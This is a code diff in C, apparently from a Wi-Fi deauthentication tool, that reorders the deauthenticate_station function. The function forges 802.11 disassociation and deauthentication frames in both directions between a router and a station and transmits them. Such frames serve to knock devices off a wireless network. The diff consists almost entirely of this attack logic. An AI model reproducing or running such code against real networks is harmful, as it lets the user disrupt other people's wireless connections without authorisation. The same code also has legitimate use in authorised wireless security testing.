@@ -432,31 +432,7 @@ uchar *get_target(uchar *bssid)
 
 void deauthenticate_station(uchar *bssid, uchar *station)
 {
-    struct packet result_packet = create_deauth_frame(station, bssid, bssid, 1);
-
-    if (verbose)
-    {
-        printf("Disassociate router -> station: \n");
-        print_packet(result_packet.data, result_packet.length);
-    }
-
-    send_packet(result_packet.data, result_packet.length);
-
-    if (verbose) printf("packet send\n\n");
-
-    result_packet = create_deauth_frame(station, bssid, bssid, 0);
-
-    if (verbose)
-    {
-        printf("Deauthenticate router -> station: \n");
-        print_packet(result_packet.data, result_packet.length);
-    }
-
-    send_packet(result_packet.data, result_packet.length);
-
-    if (verbose) printf("packet send\n\n");
-
-    result_packet = create_deauth_frame(bssid, station, bssid, 1);
+    struct packet result_packet = create_deauth_frame(bssid, station, bssid, 1);
 
     if (verbose)
     {
@@ -473,6 +449,30 @@ void deauthenticate_station(uchar *bssid, uchar *station)
     if (verbose)
     {
         printf("Deauthenticate station -> router: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
+    send_packet(result_packet.data, result_packet.length);
+
+    if (verbose) printf("packet send\n\n");
+
+    result_packet = create_deauth_frame(station, bssid, bssid, 1);
+
+    if (verbose)
+    {
+        printf("Disassociate router -> station: \n");
+        print_packet(result_packet.data, result_packet.length);
+    }
+
+    send_packet(result_packet.data, result_packet.length);
+
+    if (verbose) printf("packet send\n\n");
+
+    result_packet = create_deauth_frame(station, bssid, bssid, 0);
+
+    if (verbose)
+    {
+        printf("Deauthenticate router -> station: \n");
         print_packet(result_packet.data, result_packet.length);
     }
 
